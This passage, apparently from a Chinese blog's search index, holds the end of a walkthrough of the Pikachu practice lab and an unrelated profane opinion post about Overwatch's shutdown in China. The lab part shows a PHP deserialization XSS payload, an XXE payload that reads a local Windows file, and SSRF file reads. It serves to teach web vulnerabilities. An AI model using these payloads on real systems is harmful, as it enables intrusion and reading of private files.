<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&#x27;pikachu&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>(); <span class="comment">//创建一个对象</span></span><br><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>); <span class="comment">//把这个对象进行序列化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//运行结果 O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span></span><br><span class="line">O: 代表<span class="keyword">object</span></span><br><span class="line"><span class="number">1</span>: 代表对象名字长度为一个字符</span><br><span class="line">S: 对象名称</span><br><span class="line"><span class="number">1</span>: 代表对象里有一个变量</span><br><span class="line">s: 数据类型</span><br><span class="line"><span class="number">4</span>: 变量名称长度</span><br><span class="line">test: 变量名称</span><br><span class="line">s: 数据类型</span><br><span class="line"><span class="number">7</span>: 变量值长度</span><br><span class="line">pikachu: 变量值</span><br></pre></td></tr></table></figure>

<p><strong>反序列化unserialize()</strong></p>
<p>就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$u</span>=<span class="title function_ invoke__">unserialize</span>(<span class="string">&quot;O:1:&quot;</span>S<span class="string">&quot;:1:&#123;s:4:&quot;</span>test<span class="string">&quot;;s:7:&quot;</span>pikachu<span class="string">&quot;;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>-&gt;test; <span class="comment">//得到的结果为pikachu   </span></span><br></pre></td></tr></table></figure>

<p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line"><span class="title function_ invoke__">__construct</span>()当一个对象创建时被调用</span><br><span class="line"><span class="title function_ invoke__">__dostruct</span>() 当一个对象销毁时被调用</span><br><span class="line"><span class="title function_ invoke__">__toString</span>() 当一个对象被当作一个字符串使用</span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() 在对象在被序列化之前运行</span><br><span class="line">__wakeup 将在序列化之后立即被调用</span><br><span class="line">漏洞举例:</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$__GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">//payload: O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>我们翻阅一下这题的源代码</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212272048965.png" alt="image-20221227203107951"></p>
<p>最终代码成功利用与否提现在前端,索性我们就效仿上边生成一串xss</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212272048858.png" alt="image-20221227203459612"></p>
<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><blockquote>
<p>XXE -“xml external entity injection”<br>既”xml外部实体注入漏洞”。<br>概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p>
<p>具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。<br>现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。<br>以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</p>
<p>本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。</p>
</blockquote>
<p>我们首先使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY xxe  &quot;Charmersix&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&amp;xxe;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>发现在本地是有回显的, 这时候我们开始外部注入,试着访问一下我们电脑的<code>win.ini</code>文件(file协议只能绝对路径读取)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&amp;xxe;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212281753645.png" alt="image-20221228175327565"></p>
<p>那么我们如果修改一下源码呢</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212281807550.png" alt="image-20221228175412874"></p>
<p>先删掉<code>LIBXML_NOENT</code>试一试</p>
<p>我们可以发现<code>Charmersix</code>仍然可以回显,但是没法回显<code>win.ini</code>内容了</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212281805813.png" alt="image-20221228180526781"></p>
<h3 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h3><blockquote>
<p>不安全的url跳转</p>
<p>不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。<br>如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话<br>就可能发生”跳错对象”的问题。</p>
<p>url跳转比较直接的危害是:<br>–&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</p>
<p>这个漏洞比较简单,come on,来测一把!</p>
</blockquote>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212272052281.png" alt="image-20221227205241228"></p>
<p>成功跳转到myblog</p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><blockquote>
<p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)</strong></p>
<p>其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>,但又没有对目标地址做严格过滤与限制</p>
<p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p>
<p>数据流:攻击者—–&gt;服务器—-&gt;目标地址</p>
<p>根据后台使用的函数的不同,对应的影响和利用方法又有不一样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>()</span><br></pre></td></tr></table></figure>


<p>如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,<strong>则请做好目标地址的过滤</strong>。</p>
<p>你可以根据”SSRF”里面的项目来搞懂问题的原因</p>
</blockquote>
<h4 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h4><p>首先我们可以效仿上一题,通过http协议,url重定向到其他页面<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212281901614.png" alt="image-20221228182437601"></p>
<p>我们也可以效仿上上个漏洞,通过file协议读取一些我们想要的文件</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212281916505.png" alt="image-20221228191611449"></p>
<p>或者是像这样<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212281955376.png" alt="image-20221228195527319"></p>
<h4 id="SSRF-file-get-contents"><a href="#SSRF-file-get-contents" class="headerlink" title="SSRF(file_get_contents)"></a>SSRF(file_get_contents)</h4><p>仍然可以<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212282118622.png" alt="image-20221228211830567"></p>
<h3 id="全剧终"><a href="#全剧终" class="headerlink" title="全剧终"></a>全剧终</h3>]]></content>
      <tags>
        <tag>Web</tag>
        <tag>study</tag>
        <tag>pikachu</tag>
      </tags>
  </entry>
  <entry>
    <title>闲聊——纪念守望先锋国区停服</title>
    <url>/2023/01/24/ow/</url>
    <content><![CDATA[<p>在一切的开始, 作为一名普通中国的守望先锋玩家, 对于我来说, 这无疑是一场悲剧, 我想首先声明一下, 在这场悲剧里, 我不站边, 我选择中立, 希望大家不要给我扣帽子</p>
<h3 id="守望先锋"><a href="#守望先锋" class="headerlink" title="守望先锋"></a>守望先锋</h3><p>在1.23-1.24日 我和wanan以及Scofield, 一直陪伴守望先锋走完了最后的路, 最后几局基本就都是和平局了, 所有玩家意外的温柔, 也没有喷子, 大家凑一堆, 互相看看, 聊聊天拍拍照, 我也很荣幸是其中一员. 虽然当时守望先锋并没有强制下线, 但是大家也没有玩的心思了</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301271651371.png" alt="QQ图片20230124000846"></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301271652111.png" alt="QQ图片20230124000846"></p>
<p>就这样过了二十几分钟, 天下没有不散的宴席, 我还是退出了游戏<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301271654453.jpg" alt="InkedQQ图片20230124001828_LI"></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301271700950.png" alt="QQ图片20230124001915"></p>
<h3 id="暴雪"><a href="#暴雪" class="headerlink" title="暴雪"></a>暴雪</h3><p>关于暴雪, 在国内是比较统一的风向, 大家都喷暴雪, 觉得是暴雪的霸王条款逼走了网易, 当然也不是没有可能, 并且小粉红们最爱的最信任的观察者网也是发表了这一系列言论</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301271711044.png" alt="QQ截图20230127164528"></p>
<p>对于这些言论, 熟悉观察者网尿性的人, 当然有自己的判断能力, 观察者网最喜欢贩卖中国人的爱国情怀, 通俗点就是说, 观察者网一直在传播<code>中国人做什么都是对的</code>, 但凡大脑发育正常的,  就能判断出这是无疑是一种错误的观点, 毕竟我们伟大的领袖🐱都承认自己的错误(文革)</p>
<p>然后我就开始在百度和B站尝试收集比较客观的信息<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301271721710.png" alt="image-20230127172137541"></p>
<p>然后总结一下, 客观的信息还是很少, 基本一边倒的说暴雪是什么绿茶啊之类的, 当然也有有脑子的人提出了这个网易的实力不大行. 这里为什么说一边倒的信息就不客观呢, md我真不想解释这一点,  你们可以自行观看<a href="https://www.youtube.com/watch?v=VC5K3YlghO0">老梁的这个视频</a>, 一边倒的信息都相信的人, 我可以大致分为这么几类, 一是脑残粉, 二是大脑发育不健全. 当然我一般喜欢把这两类类当作包含关系</p>
<p>然后百度呢, 我推荐大家看一下<a href="https://baijiahao.baidu.com/s?id=1755250186789877154&wfr=spider&for=pc">这个新闻</a>有脑子的人就知道, 这tm才叫新闻, 谁tm发个新闻不去摆事实, 而是一味的偏向一方说. 然而大部分人出来发文章发视频啥的, 理论依据都是来自网易发文, 是看不懂暴雪发文吗, 还是说根本没有人帮你搬运到墙内, 还有一些人老是去过度解读, 美言之<code>小编认为</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301271737738.png" alt="image-20230127173714710"></p>
<p>这里提到了一个裁员问题, 由于我们伟大的🐻坚持三年变态清零(不知道他为啥非要坚持, 可能是自己还不如个0吧), 导致我们各大公司无奈裁员, 你裁员可以, 你tm把暴雪那边的人也裁了, 这tm出了事咋办. 暴雪提出异议是正常的, 但是无奈啊, 不裁员也发不起工资. 所以说, 当暴雪提出, 还没找到下家, 不希望让玩家损失, 想再合作六个月, 但是网易不同意啊, 这时候那些无脑狼狗又跳出来了, 喊什么网易做的好, 他们求着复合咱不同意, 太争气了, 你tm玩个游戏都要当吴京, 这得是什么无脑儿. 然而网易为啥不复合, 是跟你们这些人一样无脑为了不蒸馒头争口气吗? 如果他也无脑就不会成为大厂了, 大概率原因是, 裁员没人了, 过年期间人更少, 那些暴雪员工都撵回家了, 你让我把他们请回来, 怎么可能.</p>
<p>有很多人就把网易和暴雪比作情侣或者是夫妻嘛, 我个人也认为这个比喻很恰当. 那么玩家呢就可以说是孩子. 夫妻俩闹离婚损失最大的就是我们孩子, 这时候就会面临一个问题你到底跟谁, 但凡这个孩子是正常点的就会想到, 跟谁都够呛有好日子, 后爹后妈都不可能对你好. 但是偏有一些无脑儿就非得去跟他爹, 他爹说什么就是什么, 并且还骂他妈是婊子,是绿茶. 有一天, 他妈放心不下孩子, 跟他爹说咱们要不再坚持几年, 等这孩子长大成人了咱再离婚, 他爹不同意, 他爹早就把床都卖了, 你这回来住哪. 然后孩子呢还说, 我爹做的太对了, 不愧是我们王氏家族的, 太nb了, 就不能管着那绿茶. </p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301271812735.png" alt="image-20230127181213651"></p>
<blockquote>
<p>那么为什么会有这种孩子呢?大家都知道孩子天生是一张白纸.子不教, 父之过. 原来啊他奶是老封建从小就不让他跟外边的小孩玩, 因为他奶在村里是臭名昭著, 怕孙子知道了, 不喜欢奶奶了, 他爹呢又不敢反抗他奶, 因为他爹住的房子都是奶奶的, 他奶奶把院墙(gfw)修的很高, 门也是经常锁着, 一般不跟任何人来往, 他爹好不容易找了个外地傻媳妇, 又因为种种不合离婚了, 他爹是啃老族, 还是被迫的,因为奶奶不敢让他出去, 怕管不住他. 妈妈也不用出去工作. 爸妈离婚后, 孩子也就断绝了跟妈妈的交往, 所以爸爸说啥就是啥.</p>
</blockquote>
<p>那么这个孩子还能不能像正常孩子一样呢, 他只能通过后天自己的努力, 好好学习, 甚至是翻院墙出去学习, 跟别的孩子多交流交流, 多了解别人说什么, 而不是奶奶说什么.</p>
<h3 id="reaction-一首rap"><a href="#reaction-一首rap" class="headerlink" title="reaction 一首rap"></a>reaction 一首rap</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">你们的</span><br><span class="line"></span><br><span class="line">白嫖手段是从哪个网站窃取的段子</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">白嫖: real?</span></span><br><span class="line">显得傲慢又婊气的暴雪说着无聊的暗示</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">暴雪说什么了?不是网友一直在瞎猜?</span></span><br><span class="line">我们也不care玩你的游戏劝你回家反思</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">你不是玩家, 你怎么代表<span class="string">&#x27;我们&#x27;</span></span></span><br><span class="line">不尊重我们却忘记了是中国玩家给你饭吃</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">暴雪面向全球的公司, 靠中国玩家吃饭???</span></span><br><span class="line">你要抱着求复合了你们显得真廉价</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">求你了吗?</span></span><br><span class="line">我们身正不怕影子斜所以没人说闲话</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">说你闲话的你不看, 就装作没有是吧</span></span><br><span class="line">你暗里明里只会耍些见不得人的障眼法</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">你是暴雪高管吗?还是说你参加谈判了?你怎么什么都知道</span></span><br><span class="line">哇兄弟 你真是好大一朵白莲花</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开始阴阳嘴臭</span></span><br><span class="line">把你们那渣男 都鲨烷</span><br><span class="line"></span><br><span class="line">我可不嫌这点麻烦</span><br><span class="line"></span><br><span class="line">就算没有你我们依旧继续发展</span><br><span class="line"></span><br><span class="line">终止这场合作不得不说你们真的大胆</span><br><span class="line"></span><br><span class="line">明年的今天就是你的忌日我去给你们送盆花篮</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">网易和暴雪真不一定哪一个先死</span></span><br><span class="line">耍一点破手段所以下不来台</span><br><span class="line"></span><br><span class="line">你那恶臭的样子早已名声在外</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">同样送给ccp</span></span><br><span class="line">猪厂才不会和你同流合污和你说声拜拜</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">继续嘴臭</span></span><br><span class="line">当然在准备拉黑你们之前送你一首 爱情买卖</span><br><span class="line"></span><br><span class="line">玻璃渣渣总爱玩过家家</span><br><span class="line"></span><br><span class="line">听你们的胡言乱语像在叽叽喳喳</span><br><span class="line"></span><br><span class="line">可现在留你们的时间只剩滴滴答答</span><br><span class="line"></span><br><span class="line">别总当小丑没空陪你们嘻嘻哈哈</span><br><span class="line"></span><br><span class="line">玻璃渣渣总爱玩过家家</span><br><span class="line"></span><br><span class="line">听你们的胡言乱语像在叽叽喳喳</span><br><span class="line"></span><br><span class="line">可现在留你们的时间只剩滴滴答答</span><br><span class="line"></span><br><span class="line">别总当小丑没空陪你们嘻嘻哈哈」</span><br></pre></td></tr></table></figure>

<p>整首歌的歌词刨析就这样, 我也懒得去输他的什么押韵, 在我看来也没有什么punchline, 旋律也是比较平, 延续了他一直的说唱风格, 虽然听感不错, 但是他的歌基本都这样, 也是我曾经比较认可他的原因. </p>
<p>我最初喜欢rap是因为Tom MacDonald, 他会代表弱势发声, 他会敢于唱出不同的声音, 而不是像大部分国内地上rap, 真正上升到一定高度就没法播放了. 我喜欢rap的real/freedom/做自己/有话直说. 葫芦这首歌倒是做到了有话直说, 直接嘴臭骂人, 但是没有做到real, 在我看来就是随大流, 从歌词内容也能看出来, 毫无依据, 单纯随大流. 就像我不喜欢GAI一样, 你tm一个毒都吸的人, 还好意思出来装nm的正面人物, 以为<code>超社会</code>下架, <code>吸毒不贩毒</code>的博文删除就能装作好人了, 就不说唱的什么山歌不符合我口味, md还说什么江湖气息, 那tm所谓的江湖, 什么梁山好汉, 不就是tm现在的痞子, 扫黑除恶早tm给你打了. 还有人说什么中国风, 贩卖爱国情怀, 纯有病, 你tm中国人就是一帮痞子???都tm丢我脸, 让全球都知道你tm会武术,爱打人?</p>
<p>我向来是把做歌和做人分开看待的, 就像我认为人权和人命是分开的, 我会认为人权都没有了, 做人有什么用 like<code>不自由毋宁死</code>, like<code>歌手歌好听就行了</code></p>
<p>但是我为什么会听pgone, 讨厌GAI呢, 因为GAI去贩卖什么中国风爱国情怀，喜欢伪装自己，我不喜欢一个人特别装，表里不一，我认为这是违背黑怕精神的，他就不是一个合格的rapper，就像<code>无脸男葫芦</code>, 随大流, 没有自己的思考, 没有自己的考证.</p>
<h3 id="中国电竞"><a href="#中国电竞" class="headerlink" title="中国电竞"></a>中国电竞</h3><p>听说暴雪已经禁止中国参加炉石赛事了</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301271854112.png" alt="image-20230127185407035"></p>
<p>关于原因, 我没有在网上找到相关言论, 我个人认为最大原因就是<a href="https://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E9%95%BF%E5%9F%8E">gfw</a>你tm中国把人家墙了, 人家得费多大劲, 不如直接不让你们参加来的方便, 而且中国玩家, 外挂是真的多, 游戏素质真的低. 给赛事加大压力. </p>
<p>还把人家骂上热搜, 你怎么不敢去骂ccp, 骂gfw</p>
<p>不会有人和我高中某同学一样, 以为每个国家都有防火墙吧. 然鹅现实是, 大部分游戏分为<code>中国服</code>和<code>世界服</code>, 然后也只有中国和其他极少部分国家无法正常访问Google, 现在好像只有中国没法玩暴雪吧😂, 然后有人就跳出来说, 我们的香港和台湾不是可以访问吗? 现在你就需要想一想, 港台和中国的关系了</p>
<p>有人批判暴雪把游戏上升到了政治, tmd是谁先把游戏上升到zz的? 好像不是暴雪吧, 你个防护墙为啥要墙游戏, 或者说你为啥要有防火墙? 难道不是zz目的? 防火墙的存在本来就是zz目的, 还在这贼喊捉贼, 这里也希望小粉红们有点脑子, 多想想根本, 别tm跟着观察者网玩了.</p>
<p>而且, 你nb你也让你的网易上升到政治啊, 看看有没有人理你就完了. 这里可以以史为鉴, google退出中国, 无疑是中国的损失, 但是你tm百度退出美国, 对美国有个毛影响, 千万别以为China真的有你想象中那么nb, 盲目自大.</p>
<p>中国电竞在家长和gfw的双重影响下, 很难有未来了. 可以发现现在比较火的游戏, 竞技性比较强的, 现在玩的人比较多的游戏无非就是LOL/王者荣耀(抄袭LOL)/和平精英(抄袭pubg)/CS, 还有个什么原神不也是抄袭<code>塞尔达传说 旷野之息</code>吗?</p>
<p>这也就是为什么我们所说暴雪傲慢的原因, 你tm中国没有什么真正的国产创作, 全都中国抄袭啊, 人暴雪狂有狂的道理啊, 而且人家是世界公司, 你中国人再多, 对人家影响还能多大啊.</p>
<p>别老是骂人家, 人家也懒得理你, 别老是发出<code>中国最后的警告</code>, 不如自己强大一些, 老在这狗叫干啥呢, 真有出息, 别tm抄袭, 自己创作一款没有任何争议的, 受大家喜欢的真正的中国游戏.</p>
<p>或者说你真nb去推翻gfw, 推翻某党, 或者打到美利坚, 推特都发不了的人, 别整天在微博里woof.</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301271943220.png" alt="image-20230127194329189"></p>
<h3 id="未来"><a href="#未来" class="headerlink" title="未来"></a>未来</h3><p>人终究还是要往前看的, 不能老是盯着过去不放</p>
<p>在我刚知道网易和暴雪解约的时候, 我就在期待腾讯能来接. 但是一直没有听到这个消息, 最后还是停服了, 而且不知道下次开服是什么时候</p>
<p>唯一的好消息是有传言pdd要和暴雪合作, 但是也只是传言而已, 真实性还是没法保证<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301281202500.jpg" alt="FhwX_ajacAAqQEj"></p>
<p>但是这一切都没法从根本解决问题, 怎么除根我上边已经提到过, 我也不想在结尾强调, 所以我把它放到上边了, 免得有人只看结尾, 不看内容就给我扣屎盆子, 毕竟Chinese是很’注重结尾’的</p>
]]></content>
      <tags>
        <tag>chat</tag>
      </tags>
  </entry>
</search>
